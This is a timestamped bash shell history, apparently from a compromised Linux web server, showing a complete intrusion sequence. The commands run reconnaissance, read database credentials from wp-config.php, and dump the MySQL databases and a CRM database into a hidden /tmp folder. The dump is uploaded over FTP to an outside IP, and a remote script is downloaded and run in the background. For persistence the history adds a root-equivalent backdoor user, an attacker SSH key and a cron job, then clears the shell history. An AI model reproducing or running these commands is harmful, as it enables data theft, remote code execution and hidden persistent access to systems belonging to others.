#1790961260
whoami
#1790961265
id
#1790961271
uname -a
#1790961280
cat /etc/passwd
#1790961292
ss -tlnp
#1790961310
ps aux | grep -E 'mysql|postgres'
#1790961340
cat /var/www/html/wp-config.php
#1790961390
mysql -uroot -p'Wp!2024db' -e 'show databases'
#1790961482
mkdir -p /tmp/.x
#1790961495
mysqldump -uroot -p'Wp!2024db' --all-databases | gzip > /tmp/.x/db.sql.gz
#1790961760
sudo -u postgres pg_dump crm > /tmp/.x/crm.sql
#1790961845
tar czf /tmp/.x/www.tgz /var/www/html
#1790961930
curl -T /tmp/.x/db.sql.gz ftp://185.220.101.4/up/ --user anon:anon
#1790962020
wget -q http://185.220.101.4/k.sh -O /tmp/.x/k.sh
#1790962030
chmod +x /tmp/.x/k.sh
#1790962035
nohup /tmp/.x/k.sh >/dev/null 2>&1 &
#1790962120
useradd -o -u 0 -g 0 -M -s /bin/bash sysupd
#1790962132
echo 'sysupd:Upd@te99' | chpasswd
#1790962170
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7xq attacker@kali' >> /root/.ssh/authorized_keys
#1790962205
(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.x/k.sh') | crontab -
#1790962280
unset HISTFILE
#1790962282
history -c
